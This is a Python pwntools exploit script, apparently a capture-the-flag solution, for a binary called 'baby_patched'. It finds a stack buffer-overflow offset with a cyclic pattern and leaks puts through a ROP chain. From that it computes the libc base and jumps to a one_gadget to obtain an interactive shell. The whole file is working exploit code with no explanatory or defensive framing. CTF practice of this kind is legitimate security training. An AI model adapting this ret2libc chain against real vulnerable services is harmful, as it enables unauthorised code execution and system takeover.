from pwn import *

BINARY = './baby_patched'
LIBC = './libc.so.6'


def init():
	log.info("For remote: %s HOST PORT" % sys.argv[0])
	if len(sys.argv) > 2:
		p = remote(sys.argv[1], int(sys.argv[2]))
		return p

	else:
		# Debug
		if len(sys.argv) > 1 and sys.argv[1] == '-d':
			p = gdb.debug(BINARY,'''
			continue
			'''.format(BINARY))

		else:
			p = process(BINARY)

		return p

def getPadding():

	log.info("Getting padding for BOF...")

	p2 = process(BINARY)
	p2.sendline(cyclic(600))
	p2.wait()

	core = p2.corefile
	stack = core.rsp
	pattern = core.read(stack,4)

	PADDING = int(str(cyclic_find(pattern)))

	log.info("Padding: " + str(PADDING))

	os.system("rm ./core*")

	return PADDING


def leakLibc(f_name):
	FUNCTION_GOT = elf.got[f_name]
	log.info(f_name + ' GOT: ' + hex(FUNCTION_GOT))

	leak_rop = PADDING*b'A' + p64(POP_RDI) + p64(FUNCTION_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

	p.clean()
	p.sendline(leak_rop)

	p.recvline()

	res = p.recvline().strip()

	leak = u64(res.ljust(8, b"\x00"))

	return leak


# main function
if __name__ == "__main__":

	p = init()

	elf = ELF(BINARY, checksec=False) # Extract data from binary
	libc = ELF(LIBC, checksec=False)

	MAIN_PLT = elf.symbols['main']
	PUTS_PLT = elf.symbols['puts']
	POP_RDI = 0x400693 # From ROPgadget

	PADDING = getPadding()

	p.recvuntil(b'>')

	p.sendline(PADDING*b'A' + p64(MAIN_PLT))

	leak = leakLibc('puts')

	log.info("puts @ libc {}".format(hex(leak)))
	log.info("puts offset {}".format(hex(libc.symbols['puts'])))

	libc.address = leak - libc.symbols['puts'] #Save libc base
	log.info("libc base @ %s" % hex(libc.address))
	one_gadget = libc.address + 0x4f432

	p.recvuntil(b'>')
	rop = PADDING*b'B' + p64(one_gadget)

	p.sendline(rop)

	p.success('Got shell!')

	p.interactive()